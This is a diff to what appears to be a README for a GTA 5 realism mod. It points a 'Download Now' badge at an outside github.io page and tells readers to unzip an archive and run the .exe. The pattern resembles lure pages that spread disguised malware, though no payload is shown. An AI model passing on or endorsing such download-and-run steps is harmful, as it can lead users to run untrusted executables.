@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gta5-realism-mod-compilation.github.io/.github/)
 
 ## 📸 Overview
 ![gta5-realism-vehicle-handling](https://github.com/user-attachments/assets/20c9ab5a-1852-4594-a12b-6f18f7bf2f1f)
